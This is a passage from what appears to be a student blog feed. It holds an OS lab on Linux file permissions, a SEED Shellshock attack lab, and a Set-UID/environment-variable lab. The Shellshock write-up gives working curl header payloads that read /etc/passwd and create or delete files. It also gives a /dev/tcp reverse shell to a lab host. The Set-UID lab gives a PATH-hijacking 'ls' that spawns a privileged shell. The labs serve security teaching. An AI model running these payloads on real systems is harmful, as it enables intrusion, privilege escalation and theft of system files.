收回所有用户的执行权限</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029165852610.png" alt="image-20211029165852610"></p><p>$chmod u+x myfile  赋予文件属主执行</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029165929699.png" alt="image-20211029165929699"></p></li></ul><p>上面所述的改变用户权限的方法被称为权限符号法，还有一种更为简便的方法用来更改用户权限：<strong>二进制掩码法</strong>(绝对方法)。</p><ul><li><p>含义</p><p>绝对方法就是使用八进制数字作为掩码来设置不同的文件权限。每个八进制数字应用于一种用户类。你可以将这个数字想象为从所有者类开始从左到右与权限类别相匹配。</p><p><strong>第一个八进制数字应用于所有者类，第二个是同组类，而第三个是其他用户类</strong>。</p><p>你所选择的实际的八进制数字可以为每个用户类确定读、写和执行权限。从这一点上说，需要了解八进制数字是如何转换为二进制格式的。<br>可以认为首先将八进制数转换为二进制格式，然后每个三位二进制数字用于设置读、写和执行权限。每个二进制数字从左到右和相应的权限相匹配。如果一个二进制数字是0，那么该权限则被禁止，如果是1则被打开。第一个二进制位设置了读权限的打开与关闭，第二个设置了写权限，第三个设置了执行权限。<br>例如，一个八进制数字6转换为二进制数字110。这会将读写权限打开，执行权限关闭</p><p>由八进制到二进制的转换很麻烦，这里有个简便方法：如果赋予读权限，算4；如果赋予写权限，算2；如果赋予执行权，算1；将这些数字累加起来，如果同时拥有读取和写权限，<br>那就是2+4=6，也就是二进制里面的110。</p></li><li><p>举例：</p><p>$chmod 666 myfile ：<br>赋予所有用户读和写的权限(读+写=2+4=6)</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029170150062.png" alt="image-20211029170150062"></p><p>$chmod 744 myfile ：<br>赋予文件所有者读、写和执行的权限(读+写+执行=1+2+4=7)，所有其他用户读的权限(读＝4)。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029170209608.png" alt="image-20211029170209608"></p></li></ul><h4 id="4-更改文件和目录所属的用户和组"><a href="#4-更改文件和目录所属的用户和组" class="headerlink" title="4. 更改文件和目录所属的用户和组"></a>4. 更改文件和目录所属的用户和组</h4><p>改变文件所有者的命令是chown</p><ul><li><p>chown命令的一般形式为：chown -R -h owner file</p></li><li><p>-R选项意味着对所有子目录下的文件也都进行同样的操作。</p></li><li><p>-h选项意味着在改变符号链接文件的属主时不影响该链接所指向的目标文件。</p></li><li><p>举例</p><p>在终端中运行：$ls –l a.out<br>我们可以看到文件的拥有者是zino。<br>接着运行：$ chown root a.out<br>运行完成后我们继续运行：$ ls –l a.out<br>我们可以看到文件的拥有者是root。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029171209781.png" alt="image-20211029171209781"></p></li></ul><p>改变文件所有组的命令为chgrp</p><ul><li><p>chgrp命令的使用方式与chown基本相同：chgrp –R –h group file</p></li><li><p>-R选项意味着对所有子目录下的文件也都进行同样的操作。</p></li><li><p>-h选项意味着在改变符号链接文件的所属组时不影响该链接所指向的目标文件。</p></li><li><p>举例：在终端中运行：$ ls –l a.out<br>我们可以看出文件所属的用户组为zino。<br>接着运行：$ chgrp root a.out<br>然后继续运行：$ ls –l a.out<br>可以看出文件的所属的组为root。</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029171327096.png" alt="image-20211029171327096"></p></li><li><p>提示： </p><ul><li><p>如果你想知道自己属于哪几个用户组，可以使用group<br>和id命令：<br>$ group 或<br>$ id</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029172200328.png" alt="image-20211029172200328"></p></li><li><p>如果想要知道其它用户属于哪几个用户组，就在group<br>命令后面接上用户名，如：<br>$ group aifi<br>​$ users admin general<br>上面的命令告诉我们，aifi属于users、admin和general这三个用户组。</p></li><li><p>cat /etc/group  查看分组</p><p><img src="/2021/11/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C/image-20211029172141101.png" alt="image-20211029172141101"></p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellshock Attack lab</title>
    <link href="/2021/10/29/Shellshock_Attack_lab/"/>
    <url>/2021/10/29/Shellshock_Attack_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Shellshock-Attack-lab"><a href="#Shellshock-Attack-lab" class="headerlink" title="Shellshock_Attack_lab"></a>Shellshock_Attack_lab</h1><h2 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vul.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>setuid(geteuid());<br>system(<span class="hljs-string">&quot;/bin/ls -l&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先准备有漏洞的程序vul.c</p><p>然后我们编译运行，并将其变成一个set-UID程序</p><p>因为Ubuntu20.04中/bin/sh指向/bin/dash，而这个程序没有shellshock漏洞，所以需要更改符号链接，采用命令</p><p><code>sudo ln -sf /bin/bash_shellshock /bin/sh</code></p><p>同时我们发现20.04中/bin文件夹下没有bash_shellshock文件，所以我们需要sudo su进入root后自己cp一下。</p><p>我们定义一个shell变量foo并输出它，这样当运行set-UID程序（vul)时，shell变量会变成子进程的环境变量。由于system函数的原因，Bash会被调用，它监测到环境变量foo中存放了一个环境声明，因此会解析该声明，由于逻辑解析的漏洞，它最终会执行放在末尾的/bin/sh指令，所以我之后会成功进入一个具有root权限的shell程序。</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027172958405.png" alt="image-20211027172958405"></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027173023492.png" alt="image-20211027173023492"></p><p>将链接改回去后再次执行vul,我们发现程序正常，没有被攻击。</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027174008884.png" alt="image-20211027174008884"></p><h2 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h2><h3 id="task-2-A-Using-brower"><a href="#task-2-A-Using-brower" class="headerlink" title="task 2.A: Using brower"></a>task 2.A: Using brower</h3><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027180800482.png" alt="image-20211027180800482"></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027180830505.png" alt="image-20211027180830505"></p><p> Apache服务器会从http请求头中获取信息，赋值给CGI程序的环境变量。</p><h3 id="task-2-B-Using-curl"><a href="#task-2-B-Using-curl" class="headerlink" title="task 2.B Using curl"></a>task 2.B Using curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-v  打印出http请求头</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028162819689.png" alt="image-20211028162819689"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-A  设置User-Agent</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028162913084.png" alt="image-20211028162913084"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-e 设置Referer字段</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028163009475.png" alt="image-20211028163009475"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-H 设置额外头字段</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028163108646.png" alt="image-20211028163108646"></p><h2 id="task-3"><a href="#task-3" class="headerlink" title="task 3"></a>task 3</h2><h3 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h3><ul><li><strong>Get the server to send back the content of the /etc/passwd file.</strong></li></ul><p>利用了-A修改User-Agent字段</p><p>执行命令</p><p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028165749466.png" alt="image-20211028165749466"></p><h3 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B:"></a>Task 3.B:</h3><p> <strong>Get the server to tell you its process’ user ID. Y ou can use the /bin/id command to print out the ID information.</strong></p><p>利用-e修改Referer字段来获取ID</p><p>执行命令</p><p><code>curl -e &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028170325981.png" alt="image-20211028170325981"></p><h3 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C:"></a>Task 3.C:</h3><p> <strong>Get the server to create a file inside the /tmp folder. Y ou need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</strong></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028172005730.png" alt="image-20211028172005730"></p><p>利用-H创建额外头字段</p><p>查看tmp</p><p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/ls  /tmp &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p>创建test</p><p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/touch  /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028193945048.png" alt="image-20211028193945048"></p><h3 id="Task-3-D"><a href="#Task-3-D" class="headerlink" title="Task 3.D:"></a>Task 3.D:</h3><p> <strong>Get the server to delete the file that you just created inside the /tmp folder</strong></p><p>删除test</p><p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028194013384.png" alt="image-20211028194013384"></p><p>Q1:不能打开/etc/shadow，因为只是www-data权限，权限不够，需要root权限</p><p>Q2：不能成功，不能成功将带空格的字符串设置为环境变量，所以不能攻击成功</p><h2 id="test-4"><a href="#test-4" class="headerlink" title="test 4"></a>test 4</h2><p><code>nc -lvnp 9090</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205201563.png" alt="image-20211028205201563"></p><p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205013091.png" alt="image-20211028205013091"></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205206476.png" alt="image-20211028205206476"></p><h2 id="test-5"><a href="#test-5" class="headerlink" title="test 5"></a>test 5</h2><p>新建一个vul.cgi修改为bash后，重新dcbuild一个容器，后再次执行攻击，发现攻击无法成功。因为bash填补了shellshock漏洞，所以无法攻击成功。</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028211429143.png" alt="image-20211028211429143"></p>]]></content>
    
    
    <categories>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>环境变量和set-UID程序</title>
    <link href="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Variable-and-Set-UID-Program-Lab"><a href="#Environment-Variable-and-Set-UID-Program-Lab" class="headerlink" title="Environment Variable and Set-UID Program Lab"></a>Environment Variable and Set-UID Program Lab</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021190558511.png" alt="image-20211021190558511"></p><ul><li><p>使用<code>printenv</code>打印环境变量</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021190734705.png" alt="image-20211021190734705"></p></li><li><p>使用<code>export</code>设置环境变量的值,用<code>echo</code>查看设置结果</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192046493.png" alt="image-20211021192046493"></p></li><li><p>使用<code>unset</code>删除环境变量，用<code>echo</code>查看设置结果</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192112022.png" alt="image-20211021192112022"></p></li></ul><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1."></a>Step 1.</h3><p>首先编译<code>myprintenv.c</code>文件</p><p>然后结果保存在<code>file</code>中</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192345242.png" alt="image-20211021192345242"></p><p>观察file文件，我们可以发现是各个环境变量的值</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192715013.png" alt="image-20211021192715013"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>按照要求注释掉子进程的printenv语句，将父进程的printenv语句取消注释</p><p>重新编译，将结果保存在file2文件中，发现同样是环境变量的值</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021194639135.png" alt="image-20211021194639135"></p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>用diff命令比较file和file2的差异，发现两者是相同的，说明子进程完全继承了父进程的环境变量。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021194823695.png" alt="image-20211021194823695"></p><p>进一步查阅资料可知</p><p>子进程完全复制了父进程的资源，包括进程上下文、代码区、数据区、堆区、栈区、内存信息、打开文件的文件描述符、信号处理函数、进程优先级、进程组号、当前工作目录、根目录、资源限制和控制终端等信息，而子进程与父进程的区别有进程号、资源使用情况和计时器等。</p><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>编译运行myenv.c，发现结果为空</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, <span class="hljs-literal">NULL</span>);  <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021195206499.png" alt="image-20211021195206499"></p><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>将代码修改为如下方所示的代码后，再次编译运行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">//execve(&quot;/usr/bin/env&quot;, argv, NULL);  </span><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, environ);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现程序打印出了环境变量的值。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021195323867.png" alt="image-20211021195323867">函数execve()的作用，其调用格式如下：<br>int execve(const char * filename，char * const argv[]，char * const envp[])<br>其有三个参数，第一个参数filename指向要运行的新程序的路径，第二个参数argv数组包含新程序的所有参数，第三个参数envp数组包含新程序的环境变量。</p><p>如果将envrion传给execve()函数，则新进程想将他自己的环境变量传给新程序。如果设为NULL，则不传递任何环境变量</p><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>进程在被初始化时通过以下两种方式获取环境变量。</p><p>第一种方式，如果是一个新创建的进程，即使用fork（）系统调用(在UNLX中)生成的进程，在这种情况下，子进程的内存是父进程内存的副本，也就是说，子进程将继承父进程所有的环境变量。</p><p>第二种方式，如果进程自身通过 execve（）系统调用运行一个新的程序（而不是在子进程中运行），进程的内存将会被新程序的数据覆盖，因此进程中存储的所有环境变量将会丢失。如果一个进程希望将环境变量传递给新运行的程序，它需要在调用 execve（）函数时显式地传递环境变量。</p><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><p>保存编译运行下方的代码，可以发现结果是打印出了环境变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>);<br>return0 ;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021202226212.png" alt="image-20211021202226212"></p><p>system（）的函数说明</p><p>system（）会调用fork()产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。在调用system（）期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。</p><p>返回值</p><p>如果fork（）失败 返回-1：出现错误</p><p>如果exec（）失败，表示不能执行Shell，返回值相当于Shell执行了<a href="https://baike.baidu.com/item/exit">exit</a>（127）</p><p>如果执行成功则返回子Shell的终止状态</p><p>如果system（）在调用/bin/sh时失败则返回127，其他失败原因返回-1。若参数string为空指针（NULL），仅当命令处理程序可用时，返回非零值，可以通过这一特征判断在一个给定的操作系统上是否支持system函数(当system函数返回值为0时，表明system函数无效，在UNIX系统中，system函数总是可用的)；。如果system（）调用成功则最后会返回执行shell命令后的返回值，但是此返回值也有可能为 system（）调用/bin/sh失败所返回的127，因此最好能再检查errno 来确认执行成功。</p><h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><h3 id="Step-1-2"><a href="#Step-1-2" class="headerlink" title="Step 1"></a>Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>**environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>        i++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将代码保存在foo.c中</p><p>编译运行，打印出环境变量</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021203257312.png" alt="image-20211021203257312"></p><h3 id="Step-2-2"><a href="#Step-2-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>将程序的拥有者改为root, 同时将其变成set-UID程序</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021204849038.png" alt="image-20211021204849038"></p><h3 id="Step-3-2"><a href="#Step-3-2" class="headerlink" title="Step 3"></a>Step 3</h3><p>按照题目要求设置三个环境变量，然后运行已经是特权程序的foo。</p><p>我们可以看到wza和PATH环境变量都成功出现，但是LD_LIBRARY_PATH始终没有出现在环境变量中</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022110105522.png" alt="image-20211022110105522"></p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022110154632.png" alt="image-20211022110154632"></p><p>运行foo单独抓去LD变量，可以发现输出为空白，没有找到</p><p>我们将foo的拥有者改回seed ，发现LD_LIBRARY_PATH这个出现了。</p><p>这说明这个环境变量会对动态链接器的行为产生影响，所以它在动态链接器的进程中被屏蔽掉了，从而不会再对特权程序的动态链接产生影响。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022110351472.png" alt="image-20211022110351472"></p><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><p>运行代码</p><p>task6.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意代码</p><p>ls.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br></code></pre></td></tr></table></figure><p>将运行代码编译后保存为task6可执行文件</p><p>将恶意代码编译保存为ls,保存在当前文件夹中</p><p>首先我们执行task6,此时正常调用/bin/ls指令</p><p>然后我们改变task6的所有者为root,同时设置其为特权程序，然后将当前文件夹包含在环境变量PATH中，再次执行我们发现程序得到的只是一个普通的shell</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211024152521937.png" alt="image-20211024152521937"></p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022115545732.png" alt="image-20211022115545732"></p><p>阅读资料后我们可以知道，这是由于Ubuntu20.04的保护机制导致的，我们采用<code>sudo ln -sf /bin/zsh 